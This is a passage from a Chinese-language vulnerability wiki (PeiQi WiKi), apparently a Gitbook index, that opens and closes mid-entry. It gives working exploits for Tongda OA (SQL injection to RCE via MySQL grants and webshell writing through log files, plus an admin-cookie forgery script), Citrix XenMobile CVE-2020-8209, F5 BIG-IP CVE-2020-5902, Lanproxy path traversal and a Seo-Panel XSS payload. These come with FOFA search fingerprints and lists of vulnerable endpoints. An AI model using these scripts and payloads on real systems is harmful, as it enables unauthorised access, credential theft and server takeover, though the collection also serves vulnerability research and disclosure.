`ssl_type` = '', `ssl_cipher` = '', `x509_issuer` = '', `x509_subject` = '', `max_questions` = 0, `max_updates` = 0, `max_connections` = 0, `max_user_connections` = 0, `plugin` = 'mysql_native_password', `authentication_string` = '', `password_expired` = 'Y' WHERE `Host` = Cast('%' AS Binary(1)) AND `User` = Cast('peiqi' AS Binary(5)); 然后用注入点刷新权限，因为该用户是没有刷新权限的权限的：general/hr/manage/query/delete_cascade.php?condition_cascade=flush privileges;这样就拥有了所有权限 登录如果失败，执行 grant all privileges ON mysql.* TO 'peiqi'@'%' IDENTIFIED BY 'peiqiABC@123' WITH GRANT OPTION 利用漏洞写shell # 查路径： select @@basedir; # F:\\OA\\mysql5\\，那么web目录就是 F:/OA/webroot/ # 方法1： set global slow_query_log=on; set global slow_query_log_file='F:/OA/webroot/'; select '' or sleep(11); # 方法2： set global general_log = on; set global general_log_file = 'F:/OA/webroot/'; select ''; show variables like '%general%'; 上传大马 参考文章 通达OA v11.7后台SQL注入到RCE[0day] PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2021-01-16 04:33:19 "},"PeiQi_Wiki/OA产品漏洞/通达OA/通达OA v11.x-v11.5任意用户登录.html":{"url":"PeiQi_Wiki/OA产品漏洞/通达OA/通达OA v11.x-v11.5任意用户登录.html","title":"通达OA v11.x-v11.5任意用户登录","keywords":"","body":"通达OA v11.x-v11.5任意用户登录 漏洞描述 通达OA是一套办公系统。2020年04月17日, 通达OA官方在更新了一个v11版本安全补丁, 其中修复了一个任意用户伪造登录漏洞。 该漏洞类型为任意用户伪造，未经授权的远程攻击者可以通过精心构造的请求包进行任意用户伪造登录。 影响版本 [!NOTE] 通达OA 2017版 通达OA版本 V11.X 环境搭建 漏洞环境下载 https://cdndown.tongda2000.com/oa/2019/TDOA11.4.exe 双击安装即可 漏洞复现 使用POC获取管理员的Cookie root@kali:~/桌面# python3 1.py -v 11 -u http://xx.xxx.xxx.xxx [+]Get Available COOKIE:PHPSESSID=sr3f46qg6539khd3e3rrucoa72; path=/ 成功获得Cookie,添加Cookie访问 http://xxx.xxx.xxx.xxx/general/index.php?isIE=0&modify_pwd=0即可 漏洞利用POC ''' @Author : Sp4ce @Date : 2020-03-17 23:42:16 LastEditors : Sp4ce LastEditTime : 2020-08-27 10:21:44 @Description : Challenge Everything. ''' import requests from random import choice import argparse import json USER_AGENTS = [ \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; AcooBrowser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)\", \"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)\", \"Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.5; AOLBuild 4337.35; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)\", \"Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)\", \"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)\", \"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 1.0.3705; .NET CLR 1.1.4322)\", \"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 3.0.04506.30)\", \"Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.3 (Change: 287 c9dfb30)\", \"Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.6\", \"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.2pre) Gecko/20070215 K-Ninja/2.1.1\", \"Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9) Gecko/20080705 Firefox/3.0 Kapiko/3.0\", \"Mozilla/5.0 (X11; Linux i686; U;) Gecko/20070322 Kazehakase/0.4.5\", \"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Fedora/1.9.0.8-1.fc10 Kazehakase/0.5.6\", \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11\", \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/535.20 (KHTML, like Gecko) Chrome/19.0.1036.7 Safari/535.20\", \"Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52\", \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.11 TaoBrowser/2.0 Safari/536.11\", \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.71 Safari/537.1 LBBROWSER\", \"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; LBBROWSER)\", \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E; LBBROWSER)\", \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.84 Safari/535.11 LBBROWSER\", \"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)\", \"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; QQBrowser/7.0.3698.400)\", \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)\", \"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; SV1; QQDownload 732; .NET4.0C; .NET4.0E; 360SE)\", \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)\", \"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)\", \"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1\", \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1\", \"Mozilla/5.0 (iPad; U; CPU OS 4_2_1 like Mac OS X; zh-cn) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148 Safari/6533.18.5\", \"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0b13pre) Gecko/20110307 Firefox/4.0b13pre\", \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:16.0) Gecko/20100101 Firefox/16.0\", \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11\", \"Mozilla/5.0 (X11; U; Linux x86_64; zh-CN; rv:1.9.2.10) Gecko/20100922 Ubuntu/10.10 (maverick) Firefox/3.6.10\" ] headers={} def getV11Session(url): checkUrl = url+'/general/login_code.php' try: headers[\"User-Agent\"] = choice(USER_AGENTS) res = requests.get(checkUrl,headers=headers) resText = str(res.text).split('{') codeUid = resText[-1].replace('}\"}', '').replace('\\r\\n', '') getSessUrl = url+'/logincheck_code.php' res = requests.post( getSessUrl, data={'CODEUID': '{'+codeUid+'}', 'UID': int(1)},headers=headers) tmp_cookie = res.headers['Set-Cookie'] headers[\"User-Agent\"] = choice(USER_AGENTS) headers[\"Cookie\"] = tmp_cookie check_available = requests.get(url + '/general/index.php',headers=headers) if '用户未登录' not in check_available.text: if '重新登录' not in check_available.text: print('[+]Get Available COOKIE:' + tmp_cookie) else: print('[-]Something Wrong With ' + url + ',Maybe Not Vulnerable.') except: print('[-]Something Wrong With '+url) def get2017Session(url): checkUrl = url+'/ispirit/login_code.php' try: headers[\"User-Agent\"] = choice(USER_AGENTS) res = requests.get(checkUrl,headers=headers) resText = json.loads(res.text) codeUid = resText['codeuid'] codeScanUrl = url+'/general/login_code_scan.php' res = requests.post(codeScanUrl, data={'codeuid': codeUid, 'uid': int( 1), 'source': 'pc', 'type': 'confirm', 'username': 'admin'},headers=headers) resText = json.loads(res.text) status = resText['status'] if status == str(1): getCodeUidUrl = url+'/ispirit/login_code_check.php?codeuid='+codeUid res = requests.get(getCodeUidUrl) tmp_cookie = res.headers['Set-Cookie'] headers[\"User-Agent\"] = choice(USER_AGENTS) headers[\"Cookie\"] = tmp_cookie check_available = requests.get(url + '/general/index.php',headers=headers) if '用户未登录' not in check_available.text: if '重新登录' not in check_available.text: print('[+]Get Available COOKIE:' + tmp_cookie) else: print('[-]Something Wrong With ' + url + ',Maybe Not Vulnerable.') else: print('[-]Something Wrong With '+url + ' Maybe Not Vulnerable ?') except: print('[-]Something Wrong With '+url) if __name__ == \"__main__\": parser = argparse.ArgumentParser() parser.add_argument( \"-v\", \"--tdoaversion\", type=int, choices=[11, 2017], help=\"Target TongDa OA Version. e.g: -v 11、-v 2017\") parser.add_argument( \"-url\", \"--targeturl\", type=str, help=\"Target URL. e.g: -url 192.168.2.1、-url http://192.168.2.1\" ) args = parser.parse_args() url = args.targeturl if 'http://' not in url: url = 'http://' + url if args.tdoaversion == 11: getV11Session(url) elif args.tdoaversion == 2017: get2017Session(url) else: parser.print_help() PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2021-01-16 04:33:19 "},"PeiQi_Wiki/OA产品漏洞/通达OA/通达OA部分漏洞信息整合.html":{"url":"PeiQi_Wiki/OA产品漏洞/通达OA/通达OA部分漏洞信息整合.html","title":"通达OA部分漏洞信息整合","keywords":"","body":"通达OA部分漏洞信息整合 通达OA信息收集 http[s]://TongDaOA.domain/inc/expired.php 判断通达版本 http[s]://TongDaOA.domain/inc/reg_trial.php http[s]://TongDaOA.domain/inc/reg_trial_submit.php http[s]://TongDaOA.domain/ispirit/retrieve_pwd.php GET 参数username、email 可爆用户、邮箱 http[s]://TongDaOA.domain/resque/worker.php 计算机名 2013-2017(SQLi path) http[s]://TongDaOA.domain/module/crm2010/imageOperation/deleteImage.php http[s]://TongDaOA.domain/module/crm2010/product/type_tree.php http[s]://TongDaOA.domain/module/crm2010/select/getData.php http[s]://TongDaOA.domain/module/crm2010/select/getValue.php http[s]://TongDaOA.domain/module/crm2010/select/index.php http[s]://TongDaOA.domain/module/crm2010/share/update.php http[s]://TongDaOA.domain/portal/webportals/source/oa/news.php http[s]://TongDaOA.domain/portal/webportals/source/oa/notify.php?LOGIN_USER_ID= http[s]://TongDaOA.domain/task/crm/account_care_remind.php http[s]://TongDaOA.domain/task/crm/action_link_remind.php http[s]://TongDaOA.domain/task/crm/contract_birthday_remind.php http[s]://TongDaOA.domain/task/crm/contract_near_remind.php http[s]://TongDaOA.domain/task/crm/contract_remind.php http[s]://TongDaOA.domain/task/crm/crm_account_contact_bir_remind.php http[s]://TongDaOA.domain/task/crm/crm_complain_remind.php http[s]://TongDaOA.domain/task/crm/crm_opportunity_status_remind.php http[s]://TongDaOA.domain/task/crm/crm_salepay_remind.php http[s]://TongDaOA.domain/task/crm/crm_stockout_remind.php http[s]://TongDaOA.domain/task/crm/marketing_near_remind.php http[s]://TongDaOA.domain/task/crm/order_to_stockout_remind.php http[s]://TongDaOA.domain/task/crm/payment_near_remind.php http[s]://TongDaOA.domain/task/crm/storage_near_remind.php http[s]://TongDaOA.domain/ispirit/myoa.php http[s]://TongDaOA.domain/ispirit/retrieve_pwd.php v11~v11.6 [0day] http[s]://TongDaOA.domain/general/approve_center/list/roll_config.inc.php http[s]://TongDaOA.domain/general/bi_design/reportshop/report_bi.func.php http[s]://TongDaOA.domain/general/data_center/console/autocode/autocode.php http[s]://TongDaOA.domain/general/data_center/model_design/console/autocode/autocode.php http[s]://TongDaOA.domain/general/data_center/model_design/design/report/action.php http[s]://TongDaOA.domain/general/reportshop/design/report/action.php http[s]://TongDaOA.domain/general/project/portal/details/budget/table.php http[s]://TongDaOA.domain/general/reportshop/design/report/console/autocode/autocode.php http[s]://TongDaOA.domain/general/reportshop/workshop/report/attachment-remark/form3.php http[s]://TongDaOA.domain/general/system/user/get_key_user_info.php http[s]://TongDaOA.domain/general/workflow/list/roll_config.inc.php http[s]://TongDaOA.domain/interface/GetNewAPP.php http[s]://TongDaOA.domain/interface/GetNewAPP1.php http[s]://TongDaOA.domain/general/workflow/plugin/turn/kd_k3_applly/kd_k3_applly.php http[s]://TongDaOA.domain/general/workflow/document_list/roll_config.inc.php v11.6 [RCE] http[s]://TongDaOA.domain/module/appbuilder/assets/print.php 任意文件删除 参考文章 通达OA漏洞一些漏洞点(Github) PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2021-01-16 04:33:19 "},"PeiQi_Wiki/Web应用漏洞/":{"url":"PeiQi_Wiki/Web应用漏洞/","title":"Web应用漏洞","keywords":"","body":"Web应用漏洞整理🦌 PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2021-01-16 04:33:19 "},"PeiQi_Wiki/Web应用漏洞/Citrix XenMobile/":{"url":"PeiQi_Wiki/Web应用漏洞/Citrix XenMobile/","title":"Citrix Xen Mobile","keywords":"","body":"Citrix XenMobile企业移动性管理系统 Citrix XenMobile 任意文件读取 CVE-2020-8209 PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2021-01-16 04:33:19 "},"PeiQi_Wiki/Web应用漏洞/Citrix XenMobile/Citrix XenMobile 任意文件读取 CVE-2020-8209.html":{"url":"PeiQi_Wiki/Web应用漏洞/Citrix XenMobile/Citrix XenMobile 任意文件读取 CVE-2020-8209.html","title":"Citrix XenMobile 任意文件读取 CVE-2020-8209","keywords":"","body":"Citrix XenMobile 任意文件读取 CVE-2020-8209 漏洞描述 XenMobile是Citrix开发的企业移动性管理软件。该产品允许企业管理员工的移动设备和移动应用程序。该软件的目的是通过允许员工安全地在企业拥有的和个人移动设备及应用程序上工作来提高生产率。 CVE-2020-8209，路径遍历漏洞。此漏洞允许未经授权的用户读取任意文件，包括包含密码的配置文件 影响版本 [!NOTE] RP2之前的XenMobile服务器10.12 RP4之前的XenMobile服务器10.11 RP6之前的XenMobile服务器10.1010.9 RP5之前的XenMobile服务器 FOFA [!NOTE] title=\"XenMobile\" 漏洞复现 访问 http://xxx.xxx.xxx.xxx/jsp/help-sb-download.jsp?sbFileName=../../../etc/passwd 可以成功下载/etc/passwd文件 漏洞利用POC #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import hashlib import sys import requests import random import re import urllib3 def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mVersion: Citrix XenMobile \\033[0m') print('+ \\033[36m使用格式: python3 CVE-2020-8209.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/jsp/help-sb-download.jsp?sbFileName=../../../etc/passwd\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } try: urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=10) print(\"\\033[32m[o] 含有CVE-2020-8209漏洞，成功读取/etc/passwd\\033[0m\\n{} \".format(response.text)) except: print(\"\\033[31m[x] 漏洞利用失败 \\033[0m\") if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl > >> \\033[0m\")) POC_1(target_url) PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2021-01-16 04:33:19 "},"PeiQi_Wiki/Web应用漏洞/F5 BIG-IP/Readme.html":{"url":"PeiQi_Wiki/Web应用漏洞/F5 BIG-IP/Readme.html","title":"F 5 BIG IP","keywords":"","body":"F5 BIG-IP F5 BIG-IP 远程代码执行漏洞 CVE-2020-5902 PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2021-01-16 04:33:19 "},"PeiQi_Wiki/Web应用漏洞/F5 BIG-IP/F5 BIG-IP 远程代码执行漏洞 CVE-2020-5902.html":{"url":"PeiQi_Wiki/Web应用漏洞/F5 BIG-IP/F5 BIG-IP 远程代码执行漏洞 CVE-2020-5902.html","title":"F5 BIG-IP 远程代码执行漏洞 CVE-2020-5902","keywords":"","body":"F5 BIG-IP 远程代码执行漏洞 CVE-2020-5902 漏洞描述 2020年07月03日， 360CERT监测发现 F5 发布了 F5 BIG-IP 远程代码执行 的风险通告，该漏洞编号为 CVE-2020-5902，漏洞等级：严重。 未授权的远程攻击者通过向漏洞页面发送特制的请求包，可以造成任意 Java 代码执行。进而控制 F5 BIG-IP 的全部功能，包括但不限于: 执行任意系统命令、开启/禁用服务、创建/删除服务器端文件等。该漏洞影响控制面板受影响，不影响数据面板。 漏洞影响 [!NOTE] F5 BIG-IP 15.x: 15.1.0.4 F5 BIG-IP 14.x: 14.1.2.6 F5 BIG-IP 13.x: 13.1.3.4 F5 BIG-IP 12.x: 12.1.5.2 F5 BIG-IP 11.x: 11.6.5.2 FOFA [!NOTE] title=\"BIG-IP&reg ;- Redirect\" 漏洞复现 在 tmshCmd 的 service方法处理请求的时候，未对command 参数进行处理，直接调用 WorkspaceUtils.runTmshCommand(cmd, request); 方法执行命令，限制了执行delete,create,list,modify。 if (\"POST\".equalsIgnoreCase(request.getMethod())) { String[] cmdArray = command.split(\" \"); String operation = cmdArray[0]; String module = cmdArray[2]; if (!ShellCommandValidator.checkForBadShellCharacters(command) && (operation.equals(\"create\") || operation.equals(\"delete\") || operation.equals(\"list\") || operation.equals(\"modify\")) && WHITELISTED_TMSH_MODULES.contains(module)) { try { String[] args = new String[]{command}; Result result = Syscall.callElevated(Syscall.TMSH, args); output = result.getOutput(); error = result.getError(); } catch (CallException var11) { logger.error(NLSEngine.getString(\"ilx.workspace.error.TmshCommandFailed\") + \": \" + var11.getMessage()); error = var11.getMessage(); } } else { error = NLSEngine.getString(\"ilx.workspace.error.RejectedTmshCommand\"); } 在 fileRead 的 service方法处理请求的时候，未对 fileName 参数进行处理，直接调用 WorkspaceUtils.readFile(fileName); 方法，进行文件读取。 在 fileSave 的 service方法处理请求的时候，未对 fileName，content 参数进行处理，直接调用 WorkspaceUtils.saveFile(request); 方法，进行文件上传。 详情利用方式 https://github.com/jas502n/CVE-2020-5902 详情利用方式 https://github.com/wx3514/CVE-2020-5902/blob/master/CVE-2020-5902.md 读取文件 http://xxx.xxx.xxx.xxx/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd 写入文件 http://xxx.xxx.xxx.xxx/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp POST: fileName=/tmp/PeiQi.txt&content=PceiQi 读取文件 /tmp/PeiQi 成功写入文件 漏洞利用POC import requests import sys import json from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mVersion: F5 BIG-IP \\033[0m') print('+ \\033[36m使用格式: python3 CVE-2020-5902.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): version_url = target_url + \"/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Accept-Language\":\"zh-CN,zh;q=0.9\", } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=version_url, timeout=10, verify=False, headers=headers) if \"output\" in response.text: print(\"\\033[32m[o] 目标 {} 存在漏洞，响应为:\\n{}\\033[0m\".format(target_url, json.loads(response.text)[\"output\"])) else: print(\"\\033[31m[x] 目标漏洞无法利用 \\033[0m\") except Exception as e: print(\"\\033[31m[x] 目标漏洞无法利用 ,{}\\033[0m\".format(e)) sys.exit(0) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) 参考文章 https://mochazz.github.io/2020/07/11/F5-BIG-IP%E6%9C%AA%E6%8E%88%E6%9D%83RCE(CVE-2020-5902)/#%E6%9C%AA%E6%8E%88%E6%9D%83%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2021-01-16 04:33:19 "},"PeiQi_Wiki/Web应用漏洞/Lanproxy/Readme.html":{"url":"PeiQi_Wiki/Web应用漏洞/Lanproxy/Readme.html","title":"Lanproxy","keywords":"","body":"Lanproxy Lanproxy 目录遍历漏洞 CVE-2021-3019 PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2021-01-16 04:33:19 "},"PeiQi_Wiki/Web应用漏洞/Lanproxy/Lanproxy 目录遍历漏洞 CVE-2021-3019.html":{"url":"PeiQi_Wiki/Web应用漏洞/Lanproxy/Lanproxy 目录遍历漏洞 CVE-2021-3019.html","title":"Lanproxy 目录遍历漏洞 CVE-2021-3019","keywords":"","body":"Lanproxy 目录遍历漏洞 CVE-2021-3019 漏洞描述 Lanproxy是一个将局域网个人电脑、服务器代理到公网的内网穿透工具，支持tcp流量转发，可支持任何tcp上层协议（访问内网网站、本地支付接口调试、ssh访问、远程桌面等等）本次Lanproxy 路径遍历漏洞 (CVE-2021-3019)通过../绕过读取任意文件。该漏洞允许目录遍历读取/../conf/config.properties来获取到内部网连接的凭据。 漏洞影响 [!NOTE] Lanproxy 0.1 FOFA [!NOTE] header= \"Server: LPS-0.1\" 环境搭建 https://github.com/ffay/lanproxy/ 漏洞复现 打开登录页面如下 使用Burp抓包发送如下请求 GET /../conf/config.properties HTTP/1.1 Host: xxx.xxx.xxx.xxx Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Connection: close 成功在配置文件中读取 账号密码 试着读取其他敏感文件 PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2021-01-16 04:33:19 "},"PeiQi_Wiki/Web应用漏洞/Seo-Panel/":{"url":"PeiQi_Wiki/Web应用漏洞/Seo-Panel/","title":"Seo Panel","keywords":"","body":"Seo-Panel Seo-Panel 4.8.0 反射型XSS漏洞 CVE-2021-3002 PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2021-01-16 04:33:19 "},"PeiQi_Wiki/Web应用漏洞/Seo-Panel/Seo-Panel 4.8.0 反射型XSS漏洞  CVE-2021-3002.html":{"url":"PeiQi_Wiki/Web应用漏洞/Seo-Panel/Seo-Panel 4.8.0 反射型XSS漏洞  CVE-2021-3002.html","title":"Seo-Panel 4.8.0 反射型XSS漏洞  CVE-2021-3002","keywords":"","body":"Seo-Panel 4.8.0 反射型XSS漏洞 CVE-2021-3002 漏洞描述 Seo Panel是一个网站搜索引擎优化管理的完整控制面板。它包含了多个SEO工具来增加和跟踪你的网站性能 Seo-Panel 4.8.0以下版本存在过滤不完全的情况，造成存在 反射型XSS漏洞 漏洞影响 [!NOTE] Seo-Panel Version 环境搭建 https://github.com/seopanel/Seo-Panel 下载后放入网站根目录根据提示安装访问即可 漏洞复现 漏洞出现在找回密码页面 http://xxx.xxx.xxx.xxx/login.php?sec=forgot 成功弹窗 ,造成 反射型XSS 漏洞 漏洞POC 请求包如下 POST /login.php?sec=forgot HTTP/1.1 Host: 192.168.51.133 Content-Length: 118 Pragma: no-cache Cache-Control: no-cache Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36 Origin: http://192.168.51.133 Content-Type: application/x-www-form-urlencoded Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Referer: http://192.168.51.133/login.php?sec=forgot Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Cookie: PHPSESSID=i0qk20ehq89b29ct8krpv76vn3; yzmphp_adminid=33d5DywYQIUGS13SI7x4I0y7JiCacraGcDU1uoBx; yzmphp_adminname=1fc8yAdCyAogZ-PIz4c66dU1ij0mHsG7KGF_5tToVThEzbc Connection: close sec=requestpass&email=peiqi%40peiqi.com%22%3E%3Cimg+src%3Da+onerror%3Dalert%28%22peiqi%22%29%3Egcuak&code=12345&login= PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2021-01-16 04:33:19 "},"PeiQi_Wiki/Web应用漏洞/宝塔运维管理面板/":{"url":"PeiQi_Wiki/Web应用漏洞/宝塔运维管理面板/","title":"宝塔运维管理面板","keywords":"","body":"宝塔运维管理面板 宝塔 phpmyadmin 未授权访问漏洞 PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2021-01-16 04:33:19 "},"PeiQi_Wiki/Web应用漏洞/宝塔运维管理面板/宝塔 phpmyadmin未授权访问漏洞.html":{"url":"PeiQi_Wiki/Web应用漏洞/宝塔运维管理面板/宝塔 phpmyadmin未授权访问漏洞.html","title":"宝塔 phpmyadmin未授权访问漏洞","keywords":"","body":"宝塔 phpmyadmin未授权访问漏洞 漏洞描述 【宝塔面板】紧急安全更新通知，Linux面板7.4.2版本/Windows面板6.8版本存在安全隐患，其他版本无此风险。已发布紧急更新，请所有使用此版本的用户务必升级到最新版，更新方法，登录面板直接升级更新即可，如更新出现问题，请登录宝塔论坛反馈或者联系客服反馈 影响版本 [!NOTE] Linux正式版7.4.2 Linux测试版7.5.13 Windows正式版6.8 漏洞复现 访问 http://xxx.xxx.xxx.xxx:888/pma 即可 PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2021-01-16 04:33:19 "},"PeiQi_Wiki/Web服务器漏洞/":{"url":"PeiQi_Wiki/Web服务器漏洞/","title":"Web服务器漏洞","keywords":"","body":"Web服务器漏洞🦔 PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2021-01-16 04:33:19 "},"PeiQi_Wiki/Web服务器漏洞/Apache/":{"url":"PeiQi_Wiki/Web服务器漏洞/Apache/","title":"Apache","keywords":"","body":"Apache Apache Struts2 Struts2-Scan 工具 S2-001, S2-003, S2-005, S2-007, S2-008, S2-009, S2-012, S2-013, S2-015, S2-016, S2-019, S2-029, S2-032, S2-033, S2-037, S2-045, S2-046, S2-048, S2-052, S2-053, S2-devMode, S2-057 Apache Mod_jk Apache Mod_jk 访问控制权限绕过 CVE-2018-11759 Apache Tomcat Apache Tomcat AJP 文件包含漏洞 CVE-2020-1938 Apache Tomcat 远程代码执行漏洞 CVE-2017-12615 Apache Shiro Apache Shiro Apache Cocoon Apache Cocoon XML注入 CVE-2020-11991 Apache Flink Apache Flink 目录遍历漏洞 CVE-2020-17519 Apache Flink 小于1.9.1远程代码执行 CVE-2020-17518 Apache Kylin Apache kylin 未授权配置泄露 CVE-2020-13937 Apache Kylin 命令注入漏洞 CVE-2020-1956 Apache Kylin 命令注入漏洞 CVE-2020-13925 Apache Solr Apache Solr 远程执行漏洞 CVE-2019-0193 Apache Solr Velocity模板远程执行 CVE-2019-17558 Apache Solr RCE 远程命令执行漏洞 CVE-2017-12629 Apache Solr XXE 漏洞 CVE-2017-12629 Apache Solr JMX服务 RCE CVE-2019-12409 Apache Solr RCE 未授权上传漏洞 CVE-2020-13957 Apache Httpd Apache HTTPd 换行解析漏洞 CVE-2017-15715 PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2021-01-16 04:33:19 "},"PeiQi_Wiki/Web服务器漏洞/Apache/Apache Cocoon/":{"url":"PeiQi_Wiki/Web服务器漏洞/Apache/Apache Cocoon/","title":"Apache Cocoon","keywords":"","body":"Apache Cocoon Apache Cocoon XML注入 CVE-2020-11991 PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2021-01-16 04:33:19 "},"PeiQi_Wiki/Web服务器漏洞/Apache/Apache Cocoon/Apache Cocoon XML注入 